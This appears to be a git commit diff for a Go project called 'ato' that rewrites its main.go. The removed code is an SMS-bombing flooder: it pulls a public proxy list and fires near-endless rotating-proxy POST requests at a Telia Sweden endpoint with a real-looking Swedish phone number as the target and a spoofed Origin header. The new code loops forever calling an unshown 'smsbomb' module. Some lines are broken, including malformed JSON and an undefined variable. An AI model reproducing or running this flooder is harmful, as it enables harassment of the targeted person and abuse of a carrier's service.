553a90bbe1bac7bdd5ad00cec5449f5cf5ec2593
0x1b6f8942ed3c0a7d5f89e2640c7a2b <142523482+0x1b6f8942ed3c0a7d5f89e2640c7a2b@users.noreply.github.com>
2023-10-26 20:43:09 +0000

    message

---
+++ go.mod
@@ -0,0 +1,13 @@
+module ato
+
+go 1.21.3
+
+require github.com/valyala/fasthttp v1.50.0
+
+require (
+	github.com/andybalholm/brotli v1.0.5 // indirect
+	github.com/klauspost/compress v1.16.3 // indirect
+	github.com/valyala/bytebufferpool v1.0.0 // indirect
+	golang.org/x/net v0.8.0 // indirect
+	golang.org/x/text v0.8.0 // indirect
+)
--- main.go
+++ main.go
@@ -1,81 +1,18 @@
 package main
 
 import (
-	"bufio"
+	sms "ato/scripts/smsbomb"
 	"fmt"
-	"math/rand" // Import the "math/rand" package
-	"net/http"
 	"time"
-
-	"github.com/valyala/fasthttp"
 )
 
-var proxyList []string
-
 func main() {
-	// Fetch proxy list from an API
-	proxyList = fetchProxyList()
-	if len(proxyList) == 0 {
-		fmt.Println("No proxies available.")
-		return
+
+	// Ensure there are proxies available
+
+	fmt.Println("loading sms :: ato/scripts/smsbomb")
+	for {
+		sms.StartALL()
+		time.Sleep(time.Microsecond * 1)
 	}
-
-	for i := 0; i < 46706505038; i++ {
-		go flooder()
-		time.Sleep(time.Millisecond * 1)
-	}
-}
-
-func fetchProxyList() []string {
-	// Replace this with your proxy API endpoint
-	proxyAPIURL := "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
-
-	resp, err := http.Get(proxyAPIURL)
-	if err != nil {
-		fmt.Printf("Error fetching proxy list: %s\n", err)
-		return []string{}
-	}
-	defer resp.Body.Close()
-
-	var proxies []string
-	scanner := bufio.NewScanner(resp.Body)
-	for scanner.Scan() {
-		proxies = append(proxies, scanner.Text())
-	}
-
-	if err := scanner.Err(); err != nil {
-		fmt.Printf("Error reading proxy list: %s\n", err)
-	}
-
-	return proxies
-}
-
-func flooder() {
-	url :=  "https://sa.telia.se/se/rs/users/msisdn" // Replace with your API endpoint
-	
-
-	// Randomly select a proxy from the proxy list
-	proxy := proxyList[rand.Intn(len(proxyList))]
-	data := `{"identifiter:"46706505038"}`
-
-	req := fasthttp.AcquireRequest()
-	resp := fasthttp.AcquireResponse()
-
-	defer fasthttp.ReleaseRequest(req)
-	defer fasthttp.ReleaseResponse(resp)
-
-	req.Header.SetMethod("POST")
-	req.Header.Set("Origin", "https://www.ul.se")
-	req.Header.Set("Content-Type", "application/json")
-	req.SetRequestURI(url)
-	req.SetBodyString(data)
-
-	if err := fasthttp.Do(req, resp); err != nil {
-		fmt.Printf("Error: %s\n", err)
-		return
-	}
-
-	// Print the response status code and body
-	fmt.Println("[+] Sent a message to", phun, proxy, "has connected")
-	fmt.Println("[+]", proxy, "has connected")
 }
